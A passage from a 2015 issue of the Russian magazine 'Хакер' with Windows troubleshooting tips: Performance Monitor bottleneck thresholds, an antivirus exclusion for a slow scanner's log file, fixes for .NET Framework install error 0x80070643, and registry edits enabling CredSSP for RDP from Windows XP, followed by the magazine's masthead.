Частоту получения значений рекомендую выставить порядка пятнадцати се-
кунд. Анализ данных следует проводить на основании среднего и максималь-
ного значения для каждого счетчика на выбранном интервале времени. Эти
значения показаны в нижней части основного окна Performance Monitor.
   Теперь разберемся, что же мы будем анализировать. Думаю, ты уже запустил
процесс сбора данных и получил разные странные графики, с которыми пока не
знаешь, что делать. Вот таблица, которая поможет тебе разобраться. В ней сна-
чала идет группа, потом счетчик, описание, критерий и узкое место системы:


 Memory            Pages/sec      Интенсивность     Среднее: около 0.   Недостаточно
                                 обмена между      Максимальное:     оперативной
                                    дисковой подси-   не более 20        памяти
                                   стемой и опера-
                                     тивной памятью

  Processor[_Total]  % Processor     Загруженность    Не более 70%      Недостаточная
                     Time           процессоров       в течение          производитель-
                                                        длительного       ность процес
                                                   времени          соров
  System              Processor      Очередь         Не более 2*коли-   Недостаточная
                   Queue Length    к процессорам     чество ядер про-    производитель-
                                                      цессоров в тече-    ность процес
                                                      ние длительного    соров
                                                    времени

  Physical Disk         Avg. Disk       Очередь         Не более 2*ко-     Недостаточная
                   Queue Length    к дискам           личество дисков,   производитель-
                                                  работающих       ность дисковой
                                                      параллельно      подсистемы

  Network Interface    Bytes Total /     Скорость пере    Не более 65%      Недостаточная
                      sec            дачи данных        от пропускной      пропускная спо-
                                    через сеть         способности       собность сетево-
                                                            сетевого адаптера   го интерфейса

Узнав, что вызывает торможение, ты можешь выжать из своего железа все воз-
можное.
КАК ОТУЧИТЬ АНТИВИРУС ТОРМОЗИТЬ РАБОТУ
СТОРОННИХ ПРОГРАММ ДЛЯ РАБОТЫ
СО СКАНЕРОМ

Если ты решил заменить стандартные средства работы со сканером на что-ни-
будь, что тебе больше по нраву, то есть вероятность встретиться с досадной
ситуацией, когда сканирование одной страницы длится около десяти минут.
И виноват в этом, скорее всего, не твой сканер и не твой альтернативный софт,
а антивирус.
  Именно с такой неприятностью я недавно столкнулся. Использовался прин-
тер из большого и далеко не нового семейства HP, а сканировал я при помощи
ScanToPdf — это удобная портативная и очень простая в применении софтина.
Как выяснилось позже, проблемы были не только с ней, но и с другими подоб-
ными программами. Что это за ерунда и кто в этом виноват? Перебирая все
варианты, я нашел, в чем дело.
   Стоило отключить антивирус, и все заработало как положено. Но не остав-
лять же машину без антивируса! Первое, что приходит в голову, — это добавить
исполняемый файл ScanToPdf в исключение, однако это не дало никаких резуль-
татов. Пришлось обращаться к тяжелой артиллерии, а именно к пакету Марка
Руссиновича Sysinternals. При помощи тулзы Process Explorer можно смотреть,
что делает программа. ScanToPdf, помимо обращений к разным DLL, пишет раз-
личную служебную информацию в файл twain.log. Вот полный путь к нему:

C:\Users\%username%\AppData\Local\Temp\twain.log

И все бы ничего, но обращений слишком много, и это вызывает тревогу у ан-
тивируса. Он считает эту активность подозрительной и начинает сканировать
файл. Цикл записи и сканирования и занимает примерно десять минут. Если
добавить twain.log в исключения, то проблема полностью решится и сканиро-
вание будет проходить намного быстрее. Главное, чтобы этим не воспользова-
лись вирусописатели.
УСТРАНЯЕМ ОШИБКИ УСТАНОВКИ ОБНОВЛЕНИЯ
ПЛАТФОРМЫ .NET FRAMEWORK

При установке NET Framework 3.5 может появиться ошибка 0x80070643, кото-
рая просто завершит инсталлятор и не даст никаких объяснений. Установить
фреймворк при этом может помочь один из трех вариантов.
1. Исправление ошибок регистрации обновления ПО MSI.
2. Восстановление .NET Framework.
3. Удаление и переустановка платформы .NET Framework.

В первом варианте нужно проделать следующие шаги. Попробовать восста-
новить систему с помощью утилиты Fix it, созданной в Microsoft. Она в автома-
тическом режиме соберет информацию и внесет необходимые корректировки
в реестр (либо их можно внести самостоятельно — инструкции есть по той же
ссылке). Следом рекомендую проверить систему на наличие неустановленных
обновлений. Для этого нужно открыть центр обновлений или wuapp и нажать «По-
иск обновлений». После этого можно попробовать снова установить фреймворк.
  Во втором случае предлагаю воспользоваться еще одной фирменной ути-
литой, которая пытается исправить ошибки установки фреймворка. После за-
пуска она также просканирует систему и исправит различные ошибки.
   Если ничего не помогло, то остается только полное удаление всех фрейм-
ворков из системы с последующей очисткой. Для начала скачиваем «Средство
очистки». После запуска утилита спрашивает, какие версии необходимо уда-
лить, выбираем все и нажимаем «Очистить». После этого рекомендуется пере-
загрузить машину и начать установку с более ранних версий фреймворков.
РЕШАЕМ ПРОБЛЕМУ С ПОДКЛЮЧЕНИЕМ
WINDOWS XP К БОЛЕЕ СТАРЫМ СИСТЕМАМ ПО RDP

При подключении с Windows XP к более старшим системам по RDP можно по-
лучить примерно такое сообщение об ошибке: «Удаленный компьютер требует
проверки подлинности на уровне сети, которую данный компьютер не поддер-
живает. Обратитесь за помощью к системному администратору или в службу
технической поддержки».





Ошибка подключения по RDP

   Для решения этой проблемы нужно проделать следующие действия:
1. Проверить, что Windows XP обновлена до service pack 3.
2. Обновить клиент RDP до последней версии.
3. Внести правки в реестр.

Второй пункт, в принципе, не обязателен, первый чаще всего уже сделан, оста-
ется только последний пункт. О нем и поговорим более подробно.
   Для начала давай разберемся, откуда вообще такое сообщение об ошиб-
ке. Оказывается, в Windows Server 2008 и более поздних версиях введена до-
полнительная функция безопасности — Server Authentication. Она использует
защиту на уровне сети, и все старые клиенты из более ранних версий ОС пе-
рестают подключаться и получают данную ошибку. Теперь можно переходить
к правке реестра.
   Открываем regedit и редактируем две ветки реестра. Вот первая.

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]
В значение Security  Packages к уже существующим данным добавляем
tspkg.





Добавляем параметр tspkg в строку Security Packages

И вторая ветка.

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders]

В конце значения SecurityProviders добавляем credssp.dll
.





Добавляем значение credssp.dll в параметр SecurityProviders

После этих правок необходимо перезагрузить компьютер, и об ошибке можно
забыть
                                    18+





  № 2 (205)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                              Ирина Лободина            Алик Вайнер
                                      Верстальщик                 Обложка
                                  цифровой версии


                           РЕКЛАМА
                    Анна Яковлева         Мария Самсоненко
                       PR-менеджер            Менеджер по рекламе
                          yakovleva.a@glc.ru            samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                  Подробная информация по подписке shop.glc.ru, info@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2015